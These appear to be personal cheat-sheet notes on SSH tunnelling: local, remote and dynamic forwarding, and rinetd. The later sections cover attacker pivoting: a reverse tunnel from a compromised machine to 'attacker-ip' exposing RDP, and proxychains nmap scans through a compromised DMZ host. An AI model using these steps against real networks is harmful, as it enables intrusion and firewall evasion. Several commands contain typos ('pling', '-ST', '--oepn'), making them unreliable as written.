> https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/

# Local Port Forwarding
```
ssh -L <local-port-to-listen>:<remote-host>:<remote-port> <gateway>
```

From work:
```
ssh -L 9001:banned-site.com:80 home
curl http://localhost:9001
```

# Remote Port Forwarding
From work:
```
ssh -R 9001:intra-ssh-server:22 home
```
Server will bind port 9001 on ‘home’ machine to listen for incoming requests which would subsequently be routed through the created SSH channel visiting http://localhost:9001 in ‘home’ will fotward user to intra:80

From home:
```
ssh -p 9001 localhost
```

# Dynamic port forwarding

One local port for tunneling data to all remote destinations (SOCKS protocol)

From work:
```
ssh -D 9001 home
```

# rinetd

When outbound only 80 / 443 use port forwarding
```
nano /etc/rinetd.conf
ip1 80 ip2 3389
```
```
bindaddress bindport connectaddress connectport
```  

(ip1:80 will proxy for ip2:3389)

# Creating reverse SSH client to tunnel-out remote desktop port

Creating Tunnel


FROM remote non routable machine
```
pling -l root -pw password attacker-ip -R 3390:127.0.0.1:3389  
```
> localhost 3389 to attacker ip 3389

FROM attacker's machine
```
rdesktop localhost:3390
```

# SSH Dynamic Port Forwarding (compromised DMZ used to scan internal IPs)

Create local SOCS4 proxy:

From attacker's machine (compromised DMZ)
```
ssh -D 8080 root@DMZ-IP

netstat -antp | grep 8080

/etc/proxychains.conf
socks4 127.0.0.1 8080
proxychains nmap -p 3389 -ST -Pn non-routable-remote-ip-range --oepn

proxychains rdesktop rdp-ip-in-non-routable-range
```
